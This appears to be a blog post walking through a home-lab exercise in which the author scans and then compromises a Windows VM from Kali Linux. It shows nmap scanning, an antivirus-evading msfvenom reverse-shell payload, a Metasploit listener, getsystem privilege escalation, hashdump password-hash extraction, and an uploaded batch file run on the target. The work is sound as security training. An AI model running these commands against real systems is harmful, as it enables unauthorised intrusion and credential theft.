---
title: "System Hacking"
layout: post
---
Summary:
  1. Extracting Administrative password hashes
  2. Hiding files and extracting hidden files
  3. Creating a payload to leverage Windows exploit
  4. Privilege escalation
  5. Modifying the file system and uploading files

To begin this exercise I logged into the root account of a Kali Linux virtual machine and logged into an administrator account of a Windows OS virtual machine which will be the target. 

Once both VMs are running, I ensure that both VMs are on the same network by checking the ethernet connections. Then, I launched the nmap application which appeared as a command line and began scanning for targets with the command:

  - nmap -sP 192.168.0.0/24

Once I have determined the target IP address, I then attempted to enumerate the target to learn which services are running and which ports are open by performing a SYN scan with the command:

  - nmap -sSV -O 192.168.0.20

This resulted in five ports being opened, services identified, service info, and the versions. These were:

  PORT    STATE  SERVICE         VERSION
135/tcp   open   msrpc           Microsoft Windows RPC
139/tcp   open   netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?  
2179/tcp  open   vmrdp?
3389/tcp  open   ms-wbt-server   Micosoft Terminal Services

Service Info: OS: Windows; CPE: cpe:/o: microsoft:windows

Next, I continued by launching MetaSploit by entering the command:

  - sudo msfconsole

and searched for a specific exploit by entering the command:

  - search windows/meterpreter/reverse_tcp

and set the payload by entering the command:

  - set payload windows/meterpreter/reverse_tcp

Next, I began to configure a web server and prepare the exploit. To start I entered the commands:

  - systemctl start apache2
  - systemctl status apache2

This started the service and showed me that it is active and running.

Then, by default the apache server will not allow access to the resources located at /var/www/html so I removed this file by entering:

  - rm /var/www/html/index.html

Before running the exploit, I realized that I needed to create a directory to store the malicious file. To do this I entered the command:

  - mkdir /var/www/html/exercise

Next, I began creating the payload for the target machine by entering the command:

  - msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b '\x00' LHOST=192.168.0.2 LPORT=4444 -f exe > /var/www/html/exercise/exploit.exe

This command indicates what payload we will use, holds an encoder I used to help prevent antivirus from detecting the program, removes bad characters from the payload to help evade intrusion detection systems, and the IP address of the Kali system and the port that I listened on. 

![image](https://github.com/Devin10Dahlberg/devin10dahlberg.github.io/assets/149525072/a79e3e39-ef78-4fe0-b917-d16f79c50142)

Next, I switched to the Windows VM and downloaded the file by entering the provided IP address into the address bar and opening the previously created exercise file and downloading exploit.exe.

Once the download is complete I switched back to the Kali Linux VM so I could start the listener. I once again launched MetaSploit with sudo msfconsole and entered the command:

  - use exploit/multi/handler

Then I set the payload with the command:

  - set payload windows/meterpreter/reverse_tcp

and set the LHOST by entering the command:

  - set LHOST 192.168.0.2

Now that the listener is set up, I started to listen by entering the command: 

  - exploit -j -z

Once the exploit is completed, I switched back to the Windows VM and executed the exploit.exe file.

Switching back to the Kali VM, I could see the changes as the Meterpreter session is now open and I could see the IP addresses of both systems.

I began by entering the command:

  - sysinfo

and I was able to gather information such as the NetBIOS name, the OS version, the Domain, and the number of Logged on Users.

I then ran the command:

 - ifconfig

which allowed me to see the MAC address, and the IPv4 and IPv6 addresses along with their subnets.

<img width="260" alt="image" src="https://github.com/Devin10Dahlberg/devin10dahlberg.github.io/assets/149525072/d33e4489-6102-428f-83e2-38d60a9a98be">

I then attempted to find out whose user account I was using by entering the commands:

  - getuid
  - getsystem
  - getuid

which allowed me to use the SYSTEM account.

From here I entered the command:

  - run hashdump

which provided me with the password hashes.

<img width="410" alt="image" src="https://github.com/Devin10Dahlberg/devin10dahlberg.github.io/assets/149525072/71e3f48c-91c4-40b0-997f-546b01dc5b0f">

At this point, I am able to create, upload, and execute a bash file to the target machine.

To begin, I entered the command:

  - touch hacked.cmd
  - vim hacked.cmd

I then modified the created file by entering:

@echo off

dir /s c:\users\*.*

echo YOU HAVE BEEN HACKED

pause


This displays the phrase YOU HAVE BEEN HACKED in the command prompt without the window closing automatically on the target system.

I then left the note to the victim system by entering the command:

  - upload hacked.cmd C:\\users\\administrator\\downloads

which succesfully uploaded the file to the target system.

I then executed the batch file by entering the command:

  - execute -f hacked.cmd

When I switched back to the Window OS the file was received and the message appeared when a command prompt was opened showing a list of files from the path I specified. 








